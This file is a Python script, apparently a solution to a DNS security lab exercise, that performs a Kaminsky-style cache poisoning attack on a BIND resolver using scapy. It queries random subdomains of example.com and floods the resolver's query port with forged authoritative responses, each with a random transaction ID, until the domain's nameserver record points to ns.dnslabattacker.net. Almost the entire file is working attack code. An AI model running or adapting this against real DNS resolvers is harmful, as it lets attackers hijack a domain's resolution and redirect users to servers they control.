#!/usr/bin/env python
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(bytes(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=getRandomSubDomain()+'.example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096)
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

if __name__ == '__main__':
	hacked = False
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
	while not hacked:
		# Query BIND server for non-existent name in example.com
		name = getRandomSubDomain()
		dnsPacket = DNS(rd=1, qd=DNSQR(qname=name+'.example.com.'))
    		sendPacket(sock, dnsPacket, my_ip, my_port)
		
		# flood with different transaction IDs
		#spoofed = DNS(id=getRandomTXID(), qr=1, aa=1, ra=1, qdcount=1, ancount=1, nscount=2, arcount=0, qd=DNSQR(qname=name+".example.com", qtype='A', qclass='IN'), an=DNSRR(rrname=name+".example.com", type='A', rclass='IN', ttl=86400, rdata="93.184.216.34"), ns=DNSRR(rrname="example.com.", type="NS", ttl=86400, rdata="ns1.dnslabattacker.net")/DNSRR(rrname="example.com.", type="NS", ttl=86400, rdata="ns2.dnslabattacker.net"))
		spoofed = DNS(id=getRandomTXID(), qr=1, aa=1, rd=0, qdcount=1, ancount=1, nscount=2, arcount=0, qd=DNSQR(qname=name+".example.com."), an=DNSRR(rrname=name+".example.com.", type='A', ttl=86400, rdata="1.2.3.4"), ns=DNSRR(rrname="example.com.", type="NS", ttl=86400, rdata="ns.dnslabattacker.net.")/DNSRR(rrname="example.com.", type="NS", ttl=86400, rdata="ns.dnslabattacker.net."))
		for x in range(2000):
			sendPacket(sock, spoofed, my_ip, my_query_port)
			spoofed.id = getRandomTXID()

    		response = sock.recv(4096)
    		response = DNS(response)
		print response.show()
		if response.ns != None and response.ns[0].rdata == "ns.dnslabattacker.net.":
			hacked = True
	print("DONEZO")